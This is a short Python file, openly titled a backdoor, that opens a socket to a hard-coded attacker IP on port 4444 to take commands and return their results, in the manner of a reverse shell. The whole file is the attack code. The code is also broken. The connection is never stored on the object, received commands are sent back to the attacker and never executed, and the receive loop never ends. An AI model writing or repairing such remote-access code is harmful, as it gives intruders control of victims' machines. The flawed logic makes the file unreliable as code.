import json
import socket
import subprocess



class Backdoor:
    
    def __init__(self, attacker_ip, port):
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((attacker_ip, port))

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024)
            except ValueError:
                continue 

    def execute_system_command(self, command):
        self.send(command)
        return self.receive()

    def run(self):

        while True:
            command = connection.recv(1024).decode('utf-8')
            
            result = execute_system_command(command)
            connection.send(result)

        connection.close()

attacker_ip = "192.168.106.129"

bd = Backdoor(attacker_ip, 4444)
bd.run()
